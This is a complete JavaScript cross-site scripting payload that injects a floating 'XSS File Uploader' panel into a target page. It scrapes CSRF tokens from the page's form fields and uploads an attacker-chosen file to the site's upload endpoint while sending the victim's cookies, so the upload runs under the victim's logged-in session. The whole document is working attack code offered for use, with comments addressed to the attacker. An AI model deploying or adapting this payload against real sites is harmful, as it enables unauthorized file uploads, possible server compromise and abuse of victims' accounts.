<script>
(function() {
    // --- Configuration (Attacker might need to adjust these) ---
    const defaultUploadUrl = '/api/upload'; // IMPORTANT: Change this to the ACTUAL upload endpoint on the target server
    const defaultFieldName = 'file';     // IMPORTANT: Change this to the field name the server expects for the file (e.g., 'userFile', 'avatar', etc.)
    const defaultCsrfTokenName = 'csrf_token'; // Optional: Change if the CSRF token has a different name in forms
    const containerId = 'xss-upload-container';

    // Avoid creating multiple instances if injected repeatedly
    if (document.getElementById(containerId)) {
        console.log('XSS Uploader UI already exists.');
        return;
    }

    // --- 1. Create Styles ---
    const styles = `
        #${containerId} {
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 350px;
            background-color: #f0f0f0;
            border: 2px solid #cc0000;
            border-radius: 5px;
            padding: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            z-index: 10000; /* High z-index */
            font-family: sans-serif;
            font-size: 13px;
            color: #333;
        }
        #${containerId} h3 {
            margin: 0 0 10px 0;
            font-size: 15px;
            color: #cc0000;
            border-bottom: 1px solid #ccc;
            padding-bottom: 5px;
        }
        #${containerId} label {
            display: block;
            margin-bottom: 3px;
            font-weight: bold;
        }
        #${containerId} input[type="text"], #${containerId} input[type="file"] {
            width: calc(100% - 12px); /* Account for padding */
            padding: 5px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 12px;
        }
        #${containerId} button {
            background-color: #cc0000;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 13px;
        }
        #${containerId} button:hover {
            background-color: #a00000;
        }
        #${containerId} .xss-upload-status {
            margin-top: 10px;
            font-weight: bold;
        }
        #${containerId} .xss-upload-status.success {
            color: green;
        }
        #${containerId} .xss-upload-status.error {
            color: red;
        }
    `;
    const styleSheet = document.createElement("style");
    styleSheet.type = "text/css";
    styleSheet.innerText = styles;
    document.head.appendChild(styleSheet);

    // --- 2. Create HTML UI ---
    const container = document.createElement('div');
    container.id = containerId;

    container.innerHTML = `
        <h3>XSS File Uploader</h3>
        <label for="xss-upload-url">Target URL:</label>
        <input type="text" id="xss-upload-url" value="${defaultUploadUrl}">

        <label for="xss-field-name">Form Field Name:</label>
        <input type="text" id="xss-field-name" value="${defaultFieldName}">

        <label for="xss-csrf-token">CSRF Token (if required):</label>
        <input type="text" id="xss-csrf-token" placeholder="Leave empty or find/paste token value">

        <label for="xss-file-input">Select File:</label>
        <input type="file" id="xss-file-input" required>

        <button id="xss-upload-button">Upload File</button>
        <div id="xss-upload-status" class="xss-upload-status"></div>
    `;
    document.body.appendChild(container);

    // --- 3. Add Upload Logic ---
    const fileInput = document.getElementById('xss-file-input');
    const uploadButton = document.getElementById('xss-upload-button');
    const statusDiv = document.getElementById('xss-upload-status');
    const urlInput = document.getElementById('xss-upload-url');
    const fieldNameInput = document.getElementById('xss-field-name');
    const csrfInput = document.getElementById('xss-csrf-token');
    let selectedFile = null;

    fileInput.addEventListener('change', (event) => {
        if (event.target.files.length > 0) {
            selectedFile = event.target.files[0];
            statusDiv.textContent = `Selected: ${selectedFile.name}`;
            statusDiv.className = 'xss-upload-status'; // Reset color
            console.log("File selected:", selectedFile);
        } else {
            selectedFile = null;
            statusDiv.textContent = '';
        }
    });

    uploadButton.addEventListener('click', () => {
        const uploadUrl = urlInput.value.trim();
        const fieldName = fieldNameInput.value.trim();
        const csrfToken = csrfInput.value.trim();

        if (!selectedFile) {
            statusDiv.textContent = 'Error: No file selected.';
            statusDiv.className = 'xss-upload-status error';
            return;
        }
        if (!uploadUrl) {
            statusDiv.textContent = 'Error: Upload URL is required.';
            statusDiv.className = 'xss-upload-status error';
            return;
        }
         if (!fieldName) {
            statusDiv.textContent = 'Error: Form field name is required.';
            statusDiv.className = 'xss-upload-status error';
            return;
        }

        statusDiv.textContent = `Uploading ${selectedFile.name}...`;
        statusDiv.className = 'xss-upload-status'; // Reset color

        const formData = new FormData();
        formData.append(fieldName, selectedFile, selectedFile.name);

        // --- Attempt to find and add CSRF token automatically (SIMPLE EXAMPLE) ---
        // This is VERY basic and likely needs customization for the specific target site.
        let foundCsrfToken = csrfToken; // Use manually entered token first
        if (!foundCsrfToken) {
             try {
                 // Try finding a common CSRF input pattern
                 const csrfElement = document.querySelector(`input[name="${defaultCsrfTokenName}"], input[name="csrfmiddlewaretoken"], input[name="_token"]`);
                 if (csrfElement) {
                     foundCsrfToken = csrfElement.value;
                     console.log(`Automatically found CSRF token (${csrfElement.name}): ${foundCsrfToken}`);
                 }
             } catch (e) { console.error("Error trying to find CSRF token:", e); }
        }

        // Add CSRF token to FormData if found/provided (adjust name if needed)
        if (foundCsrfToken) {
            // You might need to know the *exact* name the server expects for the token
            formData.append(defaultCsrfTokenName, foundCsrfToken);
            // formData.append('csrfmiddlewaretoken', foundCsrfToken); // Example for Django
            // formData.append('_token', foundCsrfToken); // Example for Laravel
            console.log(`Adding CSRF token named '${defaultCsrfTokenName}' to request.`);
        } else if (!csrfToken) { // Only warn if no manual token and no auto-found token
             console.warn("No CSRF token provided or automatically found. Upload might fail if one is required.");
        }

        console.log(`Attempting upload to: ${uploadUrl} with field name: ${fieldName}`);

        // Use fetch to send the file. 'credentials: "include"' is VITAL to send the victim's cookies.
        fetch(uploadUrl, {
            method: 'POST',
            body: formData,
            credentials: 'include', // Send cookies!
            // headers: { // Usually not needed for FormData, but add if server requires specific headers
            //    'X-Requested-With': 'XMLHttpRequest' // Example header
            // }
        })
        .then(response => {
            console.log("Upload response status:", response.status);
            if (response.ok) {
                statusDiv.textContent = `Success: File uploaded (Status: ${response.status})`;
                statusDiv.className = 'xss-upload-status success';
                return response.text(); // Or response.json() if applicable
            } else {
                 statusDiv.textContent = `Error: Upload failed (Status: ${response.status})`;
                 statusDiv.className = 'xss-upload-status error';
                 return response.text().then(text => { throw new Error(`Server responded with ${response.status}: ${text}`)});
            }
        })
        .then(data => {
            console.log("Upload response data:", data);
            // Optionally display success data
        })
        .catch(error => {
            console.error("Upload fetch error:", error);
            statusDiv.textContent = `Error: ${error.message}`;
            statusDiv.className = 'xss-upload-status error';
        });
    });

    console.log("XSS File Uploader UI injected and ready.");

})(); // Immediately invoke the function
</script>
